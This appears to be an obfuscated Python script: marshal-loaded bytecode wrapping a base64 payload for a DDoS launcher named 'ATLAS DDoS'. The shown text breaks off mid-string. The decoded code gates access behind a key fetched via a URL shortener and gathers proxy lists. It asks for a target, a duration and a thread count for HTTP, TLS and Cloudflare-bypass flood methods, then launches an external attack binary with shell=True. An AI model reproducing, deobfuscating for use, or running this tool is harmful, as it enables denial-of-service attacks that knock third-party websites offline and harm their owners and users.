import marshal
exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\xf3@\x00\x00\x00\x97\x00d\x00d\x01l\x00Z\x00\x02\x00e\x01\x02\x00e\x00j\x02\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x01S\x00)\x03\xe9\x00\x00\x00\x00Na\x00N\x00\x00aW1wb3J0IG9zCmltcG9ydCBzeXMKaW1wb3J0IHRpbWUKZnJvbSBzdWJwcm9jZXNzIGltcG9ydCBydW4KZnJvbSB0aW1lIGltcG9ydCBzbGVlcApmcm9tIHNodXRpbCBpbXBvcnQgd2hpY2gKaW1wb3J0IHJlcXVlc3RzCmZyb20gdGltZSBpbXBvcnQgc3RyZnRpbWUKCnRyeToKCXJlcXVlc3RzID0gX19pbXBvcnRfXygiaHR0cHgiKQoJZnJvbSBjb2xvcmFtYSBpbXBvcnQgRm9yZSwgQmFjaywgU3R5bGUKCWZyb20gcmljaC5jb25zb2xlIGltcG9ydCBDb25zb2xlCmV4Y2VwdCBFeGNlcHRpb246CglleGl0KCJbWF0gRXJyb3I/IHRyeSB0aGlzIHBpcDMgaW5zdGFsbCByZXF1aXJlbWVudHMudHh0IikKCm5nYXk9aW50KHN0cmZ0aW1lKCclZCcpKQprZXkxPXN0cihuZ2F5KjEyNDY1NDYrMjM0NzIpCmtleSA9ICdBVExBUycra2V5MQoKdXJsID0gJ2h0dHBzOi8vd3d3LnZpZHVjaHVuZy5tbC9rZXkuaHRtbD9rZXk9JytrZXkKdG9rZW5fdHJhZmZpYyA9ICdiYzdiYzE1ZjczMTgyZjU0NTg1OTk4NzRiY2U5NmJiYmE4MzA1ZDM1Jwp0cmFmZmljID0gcmVxdWVzdHMuZ2V0KGYnaHR0cHM6Ly90cmFmZmljMXMuY29tL2FwaT9hcGk9e3Rva2VuX3RyYWZmaWN9JnVybD17dXJsfScpLmpzb24oKQppZiB0cmFmZmljWydzdGF0dXMnXT09ImVycm9yIjogCglwcmludCh0cmFmZmljWydtZXNzYWdlJ10pCglxdWl0KCkKZWxzZToKCWxpbmtfa2V5PXRyYWZmaWNbJ3Nob3J0ZW5lZFVybCddCnByaW50KCdMaW5rIEzhuqV5IFVzZXJuYW1lOiAnK2xpbmtfa2V5KQprZXluaGFwID0gaW5wdXQoJ1VzZXJuYW1lOiAnKQppZiBrZXluaGFwID09IGtleToKICAgIHByaW50KCdEdW5nJykKZWxzZToKICAgIHByaW50KCJTYWkiKQogICAgcXVpdCgpCgpjb25zb2xlID0gQ29uc29sZSgpCnRhc2tzID0gW2YidGFzayB7bn0iIGZvciBuIGluIHJhbmdlKDEsIDMpXQp3aXRoIGNvbnNvbGUuc3RhdHVzKCJbYm9sZCBncmVlbl1GaW5kaW5nIG1pc3Npbmcgb24gZmlsZXMuLi4iKSBhcyBzdGF0dXM6Cgl3aGlsZSB0YXNrczoKCQl0YXNrID0gdGFza3MucG9wKDApCgkJc2xlZXAoMSkKCQljb25zb2xlLmxvZyhmInt0YXNrfSBjb21wbGV0ZSIpCgkJdHJ5OgoJCQl3aXRoIG9wZW4oImtleS50eHQiKToKCQkJCW9wZW4oInJlcXVpcmVtZW50cy50eHQiKQoJCQkJb3BlbigiaW5zdGFsbC5zaCIpCgkJCQlwcmludCgiW1hdIEFsbCBmaWxlcyBTY2FubmVkIENvbXBsZXRlZCEiKQoJCWV4Y2VwdCBJT0Vycm9yOgoJCQlleGl0KCJbWF0gU29tZSBmaWxlcyBkb2VzIG5vdCBleGlzdCwgUGxlYXNlIGluc3RhbGwgYWdhaW4hIikKCgpkZWYgZ2V0cHJveHkoKSAtPiBOb25lOgoJcHJpbnQoIlsrXSBQbGVhc2Ugd2FpdC4uLiIpCgl3aXRoIG9wZW4oInByb3h5X3Byb3ZpZGVycy50eHQiLCBtb2RlPSJyIikgYXMgcmVhZHVybDoKCQlmb3IgdXJsIGluIHJlYWR1cmw6CgkJCXVybCA9IHVybC5zdHJpcCgpCgkJCXdpdGggb3BlbigicHJveHkudHh0IiwgbW9kZT0iYSIpIGFzIGZpbGU6CgkJCQl0cnk6CgkJCQkJZmlsZS53cml0ZShyZXF1ZXN0cy5nZXQodXJsLCB0aW1lb3V0PTEwMDApLnRleHQpCgkJCQlleGNlcHQgcmVxdWVzdHMuQ29ubmVjdEVycm9yOgoJCQkJCWV4aXQoIltYXSBDb25uZWN0aW9uIEVycm9yIikKCQkJCWV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoKCQkJCQlleGl0KCkKCQlwcmludCgiWytdIEF0dGFjayBTZW50IFN1Y2Nlc3NmdWxseSEhIikKCQlwcmludCgiWytdIFR5cGUgJ1NUT1AnIHRvIHN0b3AgeW91ciBBdHRhY2suIikKCgpkZWYgT1NjbGVhcigpOgoJb3Muc3lzdGVtKCdjbGVhcicgaWYgb3MubmFtZSA9PSAncG9zaXgnIGVsc2UgJ2NscycpCgoKZGVmIHVuYXZhaWwoKToKCXByaW50KCIiIgrilZTilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZcK4pWRICAgICAgICAgICAgU09SUlkgVEhFIE1FVEhPRCBZT1UgQVJFIFRSWUlORyBJUyBVTkFWQUlMQUJMRSAgICAgICAgICAgICAg4pWRICAgICAgICAgICAK4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWdCiAgICAiIiIpCiAKZGVmIHRvcygpOgoJcHJpbnQoIiIiXDAzM1sxOzMxOzQwbQrilZTilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZcK4pWRICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwwMzNbMjszMDs0Mm1URVJNUyBPRiBTRVJWSUNFXDAzM1sxOzMxOzQwbSAgICAgICAgICAgICAgICAgICAgICAgICAgICDilZEK4pWg4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWjCuKVkSBGUk9NIEFETUlOOiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIOKVkQrilZEgSMOgbmcgRnJlZSBLaMO0bmcgxJDGsOG7o2MgQsOhbi4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg4pWRCuKVkSBLaMO0bmcgxJDGsOG7o2MgVOG6pW4gQ8O0bmcgQ8OhYyBXZWJzaXRlIEPhu6dhIENow61uaCBQaOG7pywgICAgICAgICAgICAgICAgICAgICAgICAg4pWRIArilZEgQ2jhu4kgTWFuZyBN4bulYyDEkMOtY2ggSOG7jWMgVOG6rXAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg4pWRICAK4pWRIENo4buJIEto4buPZSBDaG8gTmfGsOG7nWkgQmnhur90IFPhu60gROG7pW5nICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIOKVkSAK4pWRIMSQ4burbmcgQ+G6p20gxJBpIEUgRMOtdCBHaeG6rXQgR2nhuq10IE5ow6kuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg4pWRCuKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVnQoKICAgICIiIikKCXdoaWxlIDE6CgkJYWNjZXB0ID0gaW5wdXQoIkRvIHlvdSBhZ3JlZSBpbiBvdXIgVE9TIFtZL05dOiAiKQoJCWlmIGFjY2VwdCBpbiBbInkiLCAiWSIsICJ5ZXMiLCAiWUVTIl06CgkJCXNsZWVwKDIpCgkJCXByaW50KCJbWF0gUHJvY2VlZGluZy4uLiIpCgkJCW1lbnUoKQoJCWVsaWYgYWNjZXB0IGluIFsibiIsICJOIiwgIm5vIiwgIk5PIl06CgkJCXNsZWVwKDIpCgkJCWV4aXQoIkdPT0RCWUUiKQoJCWVsaWYgYWNjZXB0IGluICIiOgoJCQlwYXNzCgkJZWxzZToKCQkJT1NjbGVhcigpCgkJCXRvcygpCgoKZGVmIGJhbm5lcigpOgoJcHJpbnQoIiIiXDAzM1sxOzMyOzQwbQogICAgXDAzM1sxOzMxOzQwbS0tIFsgXDAzM1syOzMwOzQybUNPTk5FQ1RJT04gRVNUQUJMSVNIRURcMDMzWzE7MzE7NDBtIF0gLS1cMDMzWzE7MzI7NDBtCiAgICAgICAgIOKVlOKVkOKVkOKVkOKVpuKVkOKVkOKVkOKVkOKVpuKVl+KUgOKUgOKVlOKVkOKVkOKVkOKVpuKVkOKVkOKVkOKVlwogICAgICAgICDilZHilZTilZDilZfilZHilZTilZfilZTilZfilZHilZHilIDilIDilZHilZTilZDilZfilZHilZTilZDilZfilZEKICAgICAgICAg4pWR4pWR4pSA4pWR4pWg4pWd4pWR4pWR4pWa4pWj4pWR4pSA4pSA4pWR4pWR4pSA4pWR4pWR4pWa4pWQ4pWQ4pWXCiAgICAgICAgIOKVkeKVmuKVkOKVneKVkeKUgOKVkeKVkeKUgOKVkeKVkeKUgOKVlOKVo+KVmuKVkOKVneKVoOKVkOKVkOKVl+KVkQogICAgICAgICDilZHilZTilZDilZfilZHilIDilZHilZHilIDilZHilZrilZDilZ3ilZHilZTilZDilZfilZHilZrilZDilZ3ilZEKICAgICAgICAg4pWa4pWd4pSA4pWa4pWd4pSA4pWa4pWd4pSA4pWa4pWQ4pWQ4pWQ4pWp4pWd4pSA4pWa4pWp4pWQ4pWQ4pWQ4pWdIFVwZGF0ZSBWMlwwMzNbMTszMTs0MG0KICAgICBcMDMzWzE7MzI7NDBtQU5PTlBSSVhPUiBcMDMzWzE7MzE7NDBtICYgXDAzM1sxOzMyOzQwbUYzNFJMM1NTIFwwMzNbMTszMTs0MG0gJiBcMDMzWzE7MzI7NDBtQVlBIFwwMzNbMTszMTs0MG1cMDMzWzE7MzE7NDBtICYgXDAzM1sxOzMyOzQwbVZpRHVjSHVuZyBcMDMzWzE7MzE7NDBtIAogICAgICBUeXBlIGRldiB0byBzZWUgd2hvIGRldmVsb3AKICAgICIiIikKCmRlZiByZXBlYXRlcigpOgoJd2hpbGUgMToKCQlyZXBlYXQgPSBpbnB1dCgiW0F0bGFzIEJvdF0gRG8geW91IHdhbnQgdG8gZ28gYmFjayB0byBtZW51PyBbWS9OXTogIikKCQlpZiByZXBlYXQgaW4gWyJ5IiwgIlkiLCAieWVzIiwgIllFUyJdOgoJCQlzbGVlcCgyKQoJCQlwcmludCgiW1hdIFByb2NlZWRpbmcuLi4iKQoJCQltZW51KCkKCQllbGlmIHJlcGVhdCBpbiBbIm4iLCAiTiIsICJubyIsICJOTyJdOgoJCQlleGl0KCkKCQllbGlmIHJlcGVhdCBpbiAiIjoKCQkJcGFzcwoJCWVsc2U6CgkJCU9TY2xlYXIoKQoJCQltZW51KCkKCgpkZWYgbWVudSgpOgoJT1NjbGVhcigpCgliYW5uZXIoKQoJcHJpbnQoIiIiCuKVlOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVlwrilZEgICAgWzFdIFVTRVIgSU5GTyBcMDMzWzE7MzI7NDBtW1NlZSB1c2VyIGluZm8sIFZJUCBvciBOT04tVklQXVwwMzNbMTszMTs0MG0gICAgICAgICAgIOKVkQrilZEgICAgWzJdIE1FVEhPRFMgXDAzM1sxOzMyOzQwbVtWaWV3IE1ldGhvZHNdXDAzM1sxOzMxOzQwbSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIOKVkQrilZEgICAgWzNdIEZJTEUgVVBEQVRFIFwwMzNbMTszMjs0MG1bWW91IGNhbiBzZWUgbmV3IHVwZGF0ZXMgaW4gb3VyIEZpbGVzXSAgXDAzM1sxOzMxOzQwbeKVkQrilZrilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZ0KCiAgICAiIiIpCgl3aGlsZSAxOgoJCWNob29zZTEgPSBpbnB1dCgiYXRsYXMtYXBpQGZyZWVAI34+ICIpCgkJaWYgY2hvb3NlMSBpbiBbIjEiLCAidXNlciIsICJ1c2VyaW5mbyIsICJpbmZvIl06CgkJCXVzZXJpbmZvKCkKCQllbGlmIGNob29zZTEgaW4gWyIyIiwgIm1ldGhvZHMiLCAiTUVUSE9EUyJdOgoJCQlsYXVuY2hmbG9vZCgpCgkJZWxpZiBjaG9vc2UxIGluIFsiMyIsICJmaWxldXBkYXRlIiwgInVwZGF0ZSJdOgoJCQlmaWxldXBkYXRlKCkKCQllbGlmIGNob29zZTEgaW4gWyJkZXYiLCAiZGV2ZWxvcGVyIl06CgkJCWRldmVsb3BlcigpCgkJZWxpZiAoY2hvb3NlMSA9PSAiIik6CgkJCXBhc3MKCmRlZiB1c2VyaW5mbygpOgogICAgT1NjbGVhcigpCiAgICBwcmludCgiIiIK4pWU4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWXCuKVkSAgICAgVVNFUiBUWVBFOiBcMDMzWzE7MzI7NDBtRlJFRS1VU0VSICAgICAgICBcMDMzWzE7MzE7NDBtICAgICAgICAgICAgICAgICAgICAgICAgICAg4pWRCuKVkSAgICAgQURNSU4gUEVSTTogXDAzM1sxOzMyOzQwbU5PIFBFUk1JU1NJT04gICAgIFwwMzNbMTszMTs0MG0gICAgICAgICAgICAgICAgICAgICAgICAg4pWRCuKVkSAgICAgQVRUQUNLIFRJTUU6IFwwMzNbMTszMjs0MG1VTkxJTUlURUQgICAgICAgXDAzM1sxOzMxOzQwbSAgICAgICAgICAgICAgICAgICAgICAgICAg4pWRCuKVkSAgICAgVVNFUiBFWFBJUkFUSU9OOiBcMDMzWzE7MzI7NDBtSmFudWFyeSAxLCAyMDM4ICAgIFwwMzNbMTszMTs0MG0gICAgICAgICAgICAgICAgICAg4pWRCuKVkSAgICAgTUVUSE9EUyBBQ0NFU1M6IFwwMzNbMTszMjs0MG1UUlVFICAgICAgICAgICAgICBcMDMzWzE7MzE7NDBtICAgICAgICAgICAgICAgICAgICAg4pWRCuKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVnQogICAgIiIiKQogICAgcmVwZWF0ZXIoKQoKZGVmIG1ldGhvZGJhbm5lcigpOgoJcHJpbnQoIiIiCiAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgG1sxOzM2bSDilZTilabilZcg4pSM4pSA4pSQ4pSM4pSs4pSQ4pSsIOKUrOKUjOKUgOKUkOKUjOKUrOKUkOKUjOKUgOKUkAogICAgICAgICAgICAgICAgICAgICAgICAgICAbWzE7MzZt4pWR4pWR4pWRIOKUnOKUpCAg4pSCIOKUnOKUgOKUpOKUgiDilIIg4pSC4pSC4pSU4pSA4pSQCiAgICAgICAgICAgICAgICAgICAgICAgICAgIBtbMTszNm3ilakg4pWpIOKUlOKUgOKUmCDilLQg4pS0IOKUtOKUlOKUgOKUmOKUgOKUtOKUmOKUlOKUgOKUmAogICAgICAgICAgICAgICAgICAgICAgIBtbMzg7MjsyNTU7MDsyNTVtQVRMQVMgG1sxOzM2bUREb1MsICAbWzE7MzFtRnJlZSBNZXRob2RzIEREb1MuCiAgICAgICAgICAgICAgICAgIBtbMzg7MjsyNDM7MTI7MjU1beKVmuKVphtbMzg7MjsyMzc7MTg7MjU1beKVkOKVkOKVkOKVkBtbMzg7MjsyMzE7MjQ7MjU1beKVkOKVkOKVkOKVkBtbMzg7MjsyMjU7MzA7MjU1beKVkOKVkOKVkBtbMzg7MjsyMTk7MzY7MjU1beKVkOKVkBtbMzg7MjsyMTM7NDI7MjU1beKVkOKVkBtbMzg7MjsyMDc7NDg7MjU1beKVkOKVkBtbMzg7MjsyMDE7NTQ7MjU1beKVkBtbMzg7MjsxOTU7NjA7MjU1beKVkBtbMzg7MjsxODk7NjY7MjU1beKVkBtbMzg7MjsxODM7NzI7MjU1beKVkBtbMzg7MjsxNzc7Nzg7MjU1beKVkBtbMzg7MjsxNzE7ODQ7MjU1beKVkBtbMzg7MjsxNjU7OTA7MjU1beKVkBtbMzg7MjsxNTk7OTY7MjU1beKVkBtbMzg7MjsxNTM7MTAyOzI1NW3ilZAbWzM4OzI7MTQ3OzEwODsyNTVt4pWQG1szODsyOzE0MTsxMTQ7MjU1beKVkBtbMzg7MjsxMzU7MTIwOzI1NW3ilZAbWzM4OzI7MTI5OzEyNjsyNTVt4pWQG1szODsyOzEyMzsxMzI7MjU1beKVkBtbMzg7MjsxMTc7MTM4OzI1NW3ilZAbWzM4OzI7MTExOzE0NDsyNTVt4pWQG1szODsyOzEwNTsxNTA7MjU1beKVkBtbMzg7Mjs5OTsxNTY7MjU1beKVkBtbMzg7Mjs5MzsxNjI7MjU1beKVkBtbMzg7Mjs4NzsxNjg7MjU1beKVkBtbMzg7Mjs4MTsxNzQ7MjU1beKVphtbMzg7Mjs3NTsxODA7MjU1beKVnQogICAgICAgICAgICAgIBtbMzg7MjsyNTU7MDsyNTVt4pWUG1szODsyOzI0OTs2OzI1NW3ilZDilZDilZAbWzM4OzI7MjQzOzEyOzI1NW3ilZDilakbWzM4OzI7MjM3OzE4OzI1NW3ilZDilZAbWzM4OzI7MjMxOzI0OzI1NW3ilZDilZAbWzM4OzI7MjI1OzMwOzI1NW3ilZDilZAbWzM4OzI7MjE5OzM2OzI1NW3ilZDilZAbWzM4OzI7MjEzOzQyOzI1NW3ilZDilZAbWzM4OzI7MjA3OzQ4OzI1NW3ilZDilZAbWzM4OzI7MjAxOzU0OzI1NW3ilZAbWzM4OzI7MTk1OzYwOzI1NW3ilZAbWzM4OzI7MTg5OzY2OzI1NW3ilZAbWzM4OzI7MTgzOzcyOzI1NW3ilZAbWzM4OzI7MTc3Ozc4OzI1NW3ilZAbWzM4OzI7MTcxOzg0OzI1NW3ilZAbWzM4OzI7MTY1OzkwOzI1NW3ilZAbWzM4OzI7MTU5Ozk2OzI1NW3ilZAbWzM4OzI7MTUzOzEwMjsyNTVt4pWQG1szODsyOzE0NzsxMDg7MjU1beKVkBtbMzg7MjsxNDE7MTE0OzI1NW3ilZAbWzM4OzI7MTM1OzEyMDsyNTVt4pWQG1szODsyOzEyOTsxMjY7MjU1beKVkBtbMzg7MjsxMjM7MTMyOzI1NW3ilZAbWzM4OzI7MTE3OzEzODsyNTVt4pWQG1szODsyOzExMTsxNDQ7MjU1beKVkBtbMzg7MjsxMDU7MTUwOzI1NW3ilZAbWzM4OzI7OTk7MTU2OzI1NW3ilZAbWzM4OzI7OTM7MTYyOzI1NW3ilZAbWzM4OzI7ODc7MTY4OzI1NW3ilZAbWzM4OzI7ODE7MTc0OzI1NW3ilZDilZDilZDilZDilZDilakbWzM4OzI7NzU7MTgwOzI1NW3ilZAbWzM4OzI7Njk7MTg2OzI1NW3ilZAbWzM4OzI7NjM7MTkyOzI1NW3ilZAbWzM4OzI7NTc7MTk4OzI1NW3ilZAbWzM4OzI7NTE7MjA0OzI1NW3ilZcKICAgICAgICAgICAgICAbWzM4OzI7MjU1OzA7MjU1beKVkSBcMDMzWzE7NG1ceDFiWzM4OzI7MjU1OzIxNTswbUhUVFAtU1RPUk1cMDMzWzBtICAbWzM4OzI7MjEzOzQyOzI1NW3ilZTilZcgIFwwMzNbMTs0bVx4MWJbMzg7MjsyNTU7MjE1OzBtSFRUUFwwMzNbMG0gICAgICAgICAbWzM4OzI7MTM1OzEyMDsyNTVt4pWUG1szODsyOzEyOTsxMjY7MjU1beKVlyAgXDAzM1sxOzRtXHgxYlszODsyOzI1NTsyMTU7MG1IVFRQLU5VTExcMDMzWzBtICAgIBtbMzg7Mjs1MTsyMDQ7MjU1beKVkQogICAgICAgICAgICAgIBtbMzg7MjsyNTU7MDsyNTVt4pWRIFwwMzNbMTs0bVx4MWJbMzg7MjsyNTU7MjE1OzBtR0VULUZMT09EXDAzM1swbSAgIBtbMzg7MjsyMTM7NDI7MjU1beKVkeKVkSAgXDAzM1sxOzRtXHgxYlszODsyOzI1NTsyMTU7MG1IVFRQLVNPQ0tFVFwwMzNbMG0gIBtbMzg7MjsxMzU7MTIwOzI1NW3ilZEbWzM4OzI7MTI5OzEyNjsyNTVt4pWRICBcMDMzWzE7NG1ceDFiWzM4OzI7MjU1OzIxNTswbUNGLUtJTExcMDMzWzBtICAgICAgG1szODsyOzUxOzIwNDsyNTVt4pWRCiAgICAgICAgICAgICAgG1szODsyOzI1NTswOzI1NW3ilZEgXDAzM1sxOzRtXHgxYlszODsyOzI1NTsyMTU7MG1UTFNcMDMzWzBtICAgICAgICAgG1szODsyOzIxMzs0MjsyNTVt4pWa4pWdICBcMDMzWzE7NG1ceDFiWzM4OzI7MjU1OzIxNTswbVwwMzNbMG0gICAgICAgICAgICAgG1szODsyOzEzNTsxMjA7MjU1beKVmhtbMzg7MjsxMjk7MTI2OzI1NW3ilZ0gIFwwMzNbMTs0bVx4MWJbMzg7MjsyNTU7MjE1OzBtXDAzM1swbSAgICAgICAgICAgICAbWzM4OzI7NTE7MjA0OzI1NW3ilZEKICAgICAgICAgICAgICAbWzM4OzI7MjU1OzA7MjU1beKVmhtbMzg7MjsyNDk7NjsyNTVt4pWQ4pWQ4pWQ4pWQ4pWQG1szODsyOzI0MzsxMjsyNTVt4pWQ4pWQ4pWQ4pWQG1szODsyOzIzNzsxODsyNTVt4pWQ4pWQ4pWQG1szODsyOzIzMTsyNDsyNTVt4pWQ4pWQG1szODsyOzIyNTszMDsyNTVt4pWQ4pWQG1szODsyOzIxOTszNjsyNTVt4pWQ4pWQG1szODsyOzIxMzs0MjsyNTVt4pWQ4pWQG1szODsyOzIwNzs0ODsyNTVt4pWQ4pWQG1szODsyOzIwMTs1NDsyNTVt4pWQG1szODsyOzE5NTs2MDsyNTVt4pWQG1szODsyOzE4OTs2NjsyNTVt4pWQG1szODsyOzE4Mzs3MjsyNTVt4pWQG1szODsyOzE3Nzs3ODsyNTVt4pWQG1szODsyOzE3MTs4NDsyNTVt4pWQG1szODsyOzE2NTs5MDsyNTVt4pWQG1szODsyOzE1OTs5NjsyNTVt4pWQG1szODsyOzE1MzsxMDI7MjU1beKVkBtbMzg7MjsxNDc7MTA4OzI1NW3ilZAbWzM4OzI7MTQxOzExNDsyNTVt4pWQG1szODsyOzEzNTsxMjA7MjU1beKVkBtbMzg7MjsxMjk7MTI2OzI1NW3ilZAbWzM4OzI7MTIzOzEzMjsyNTVt4pWQG1szODsyOzExNzsxMzg7MjU1beKVkBtbMzg7MjsxMTE7MTQ0OzI1NW3ilZAbWzM4OzI7MTA1OzE1MDsyNTVt4pWQG1szODsyOzk5OzE1NjsyNTVt4pWQG1szODsyOzkzOzE2MjsyNTVt4pWQG1szODsyOzg3OzE2ODsyNTVt4pWQG1szODsyOzgxOzE3NDsyNTVt4pWQG1szODsyOzc1OzE4MDsyNTVt4pWQG1szODsyOzY5OzE4NjsyNTVt4pWQG1szODsyOzYzOzE5MjsyNTVt4pWQG1szODsyOzU3OzE5ODsyNTVt4pWQG1szODsyOzUxOzIwNDsyNTVt4pWdCiAgICAgIiIiKQogIApkZWYgbGF1bmNoZmxvb2QoKToKCU9TY2xlYXIoKQoJbWV0aG9kYmFubmVyKCkKCXdoaWxlIDE6CgkJbWV0aG9kcyA9IGlucHV0KCJbWF0gQ2hvb3NlIE1ldGhvZHM6ICIpCgkJaWYgbWV0aG9kcyBpbiBbIkhUVFAtU1RPUk0iLCAiaHR0cC1zdG9ybSJdOgoJCQl0cnk6CgkJCQl0YXJnZXQgPSBpbnB1dCgiW1hdIFRhcmdldDogIikKCQkJCWZsb29kdGltZSA9IGludChpbnB1dCgiW1hdIFRpbWU6ICIpKQoJCQkJdGhyZWFkID0gaW50KGlucHV0KCJbWF0gVGhyZWFkcyBbNS0xMF06ICIpKQoJCQkJZ2V0cHJveHkoKQoJCQkJcnVuKFtmJ3NjcmVlbiAtZG0gLi9tZXRob2RzL0FUTEFTLU1FVEhPRFMge3RhcmdldH0ge2Zsb29kdGltZX0gc3Rvcm0ge3RocmVhZH0nXSwgc2hlbGw9VHJ1ZSkKCQkJZXhjZXB0OgoJCQkJcHJpbnQoIkVycm9yIHRyeSBhZ2FpbiIpCgkJZWxpZiBtZXRob2RzIGluIFsiSFRUUCIsICJodHRwIl06CgkJCXRyeToKCQkJCXRhcmdldCA9IGlucHV0KCJbWF0gVGFyZ2V0OiAiKQoJCQkJZmxvb2R0aW1lID0gaW50KGlucHV0KCJbWF0gVGltZTogIikpCgkJCQl0aHJlYWQgPSBpbnQoaW5wdXQoIltYXSBUaHJlYWRzIFs1LTEwXTogIikpCgkJCQlnZXRwcm94eSgpCgkJCQlydW4oW2Ync2NyZWVuIC1kbSAuL21ldGhvZHMvQVRMQVMtTUVUSE9EUyB7dGFyZ2V0fSB7Zmxvb2R0aW1lfSBwcm94eSB7dGhyZWFkfSddLCBzaGVsbD1UcnVlKQoJCQlleGNlcHQ6CgkJCQlwcmludCgiRXJyb3IgdHJ5IGFnYWluIikKCQllbGlmICBtZXRob2RzIGluIFsiSFRUUC1OVUxMIiwgImh0dHAtbnVsbCJdOgoJCQl0cnk6CgkJCQl0YXJnZXQgPSBpbnB1dCgiW1hdIFRhcmdldDogIikKCQkJCWZsb29kdGltZSA9IGludChpbnB1dCgiW1hdIFRpbWU6ICIpKQoJCQkJdGhyZWFkID0gaW50KGlucHV0KCJbWF0gVGhyZWFkcyBbNS0xMF06ICIpKQoJCQkJZ2V0cHJveHkoKQoJCQkJcnVuKFtmJ3NjcmVlbiAtZG0gLi9tZXRob2RzL0FUTEFTLU1FVEhPRF